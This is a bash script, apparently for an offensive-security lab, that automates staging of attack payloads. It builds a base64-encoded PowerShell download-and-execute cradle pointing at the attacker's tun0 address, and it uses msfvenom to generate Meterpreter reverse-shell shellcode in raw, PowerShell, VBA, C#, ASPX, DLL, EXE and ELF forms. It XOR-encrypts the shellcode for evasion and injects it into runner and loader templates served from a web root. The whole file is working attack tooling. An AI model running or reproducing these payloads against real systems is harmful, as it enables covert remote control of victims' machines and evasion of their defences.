#!/bin/bash

sudo rm /var/www/html/payloads/*
sudo rm /var/www/html/shellcode/*

ip_address=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

echo "[*] Creating download execute cradle..."
placeholder_cradle="./placeholders/placeholder_cradle.txt"
new_cradle="/var/www/html/payloads/cradle.txt"
sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_cradle" > "$new_cradle"
echo "[+] cradle.txt created!"
echo ""

echo "[*] Encoding cradle.txt..."
echo "powershell -e $(cat /var/www/html/payloads/cradle.txt | iconv -t utf16le | base64 -w 0)" >> /var/www/html/payloads/cradle.b64
echo "[+] cradle.b64 created!"
echo ""

echo "[*] Creating meterpreter binary shellcode..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o /var/www/html/shellcode/met_https_443_x64.bin
echo ""

echo "[*] Creating meterpreter ps1 shellcode..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1 -o /var/www/html/shellcode/met_https_443_x64.ps1
echo ""

echo "[*] Creating meterpreter VBA shellcode..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x86 --payload windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication -o /var/www/html/shellcode/met_https_443_x86.vba
echo ""

echo "[*] Creating meterpreter csharp shellcode..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp -o /var/www/html/shellcode/met_https_443_x64.csharp
echo ""

echo "[*] Creating meterpreter encrypted csharp shellcode..."
inputFile="/var/www/html/shellcode/met_https_443_x64.bin"
outputFile="/var/www/html/shellcode/enc_met_https_443_x64.csharp"
key=0x77
# Read the contents of the shellcode file into a byte array
shellcode=$(xxd -p "$inputFile" | tr -d '\n')
shellcode=$(echo "$shellcode" | xxd -r -p)
# Get the length of the shellcode
size=$(echo -n "$shellcode" | wc -c)
# Encrypt the shellcode using XOR and format as a C# array 
echo -n "byte[] enc = new byte[$size] {" > "$outputFile" 
for (( i=0; i<$size; i++ )); do 
	byte=$(printf "%d" "'$(printf '%s' "$shellcode" | dd bs=1 count=1 skip=$i 2>/dev/null)")
	encrypted_byte=$(printf "0x%02x" "$((byte ^ key))") 
	if [ "$i" -eq 29 ]; then 
		# Break line after first 30 bytes
		echo "$encrypted_byte," >> "$outputFile" 
	elif [ "$i" -eq "$(($size - 1))" ]; then
		# Last byte, no trailing comma
		echo -n "$encrypted_byte" >> "$outputFile" 
	elif [ $(( (i - 29) % 36 )) -eq 0 ]; then 
		# New line every 36 bytes
		echo "$encrypted_byte," >> "$outputFile" 
	else
		echo -n "$encrypted_byte," >> "$outputFile" 
	fi
done 
echo "};" >> "$outputFile" 
echo "[+] Saved as: $outputFile"
echo ""

echo "[*] Creating meterpreter aspx payload..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f aspx -o /var/www/html/payloads/met_https_443_x64.aspx
echo ""

echo "[*] Creating meterpreter dll payload..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/payloads/met_https_443_x64.dll
echo ""

echo "[*] Creating meterpreter exe payload..."
msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o /var/www/html/payloads/met_https_443_x64.exe
echo ""

echo "[*] Ceating meterpreter elf payload..."
msfvenom --platform linux --arch x64 --payload linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread --encoder x64/xor_dynamic prependfork=true -f elf -o /var/www/html/payloads/met_tcp_443_x64.elf
echo ""

echo "[*] Creating meterpreter powershell runners..."
placeholder_run="./placeholders/placeholder_run.txt"
placeholder_run_at="./placeholders/placeholder_run_at.txt"
new_runner="/var/www/html/payloads/run.txt"
new_runner_at="/var/www/html/payloads/run_at.txt"
cp "$placeholder_run" "$new_runner"
cp "$placeholder_run_at" "$new_runner_at"
powershell_shellcode="/var/www/html/shellcode/met_https_443_x64.ps1"
replace_content=$(cat "$powershell_shellcode")
sed -i "s/PLACEHOLDER/$replace_content/" "$new_runner"
sed -i "s/PLACEHOLDER/$replace_content/" "$new_runner_at"
echo "[+] run.txt created!"
echo "[+] run_at.txt created!"
echo ""

echo "[*] Creating meterpreter powershell loader..."
placeholder_load="./placeholders/placeholder_load.txt"
new_loader="/var/www/html/payloads/load.txt"
sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_load" > "$new_loader"
echo "[+] load.txt created!"
echo ""

echo "[*] Creating meterpreter VBA runner..."
placeholder_vba_run="./placeholders/placeholder_vba_run.txt"
new_vba_runner="/var/www/html/payloads/run.vba"
vba_shellcode="/var/www/html/shellcode/met_https_443_x86.vba"
cp "$placeholder_vba_run" "$new_vba_runner"
awk '/PLACEHOLDER/{exit} {print}' "$new_vba_runner" > /tmp/vba_before.txt
awk '/PLACEHOLDER/{found=1; next} found {print}' "$new_vba_runner" > /tmp/vba_after.txt
cat /tmp/vba_before.txt "$vba_shellcode" /tmp/vba_after.txt > "$new_vba_runner"
rm /tmp/vba_before.txt /tmp/vba_after.txt
echo "[+] run.vba created!"
echo ""

echo "[*] Creating meterpreter VBA loader..."
placeholder_vba_load="./placeholders/placeholder_vba_load.txt"
new_vba_loader="/var/www/html/payloads/load.vba"
sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_vba_load" > "$new_vba_loader"
echo "[+] load.vba created!"
echo ""

echo "[*] Creating meterpreter C# runner..."
placeholder_cs_run="./placeholders/placeholder_run.cs"
new_cs_runner="/var/www/html/payloads/run.cs"
cs_shellcode="/var/www/html/shellcode/met_https_443_x64.csharp"
cp "$placeholder_cs_run" "$new_cs_runner"
awk '/PLACEHOLDER/{exit} {print}' "$new_cs_runner" > /tmp/cs_before.txt
awk '/PLACEHOLDER/{found=1; next} found {print}' "$new_cs_runner" > /tmp/cs_after.txt
cat /tmp/cs_before.txt "$cs_shellcode" /tmp/cs_after.txt > "$new_cs_runner"
rm /tmp/cs_before.txt /tmp/cs_after.txt
echo "[+] run.cs created!"
echo ""
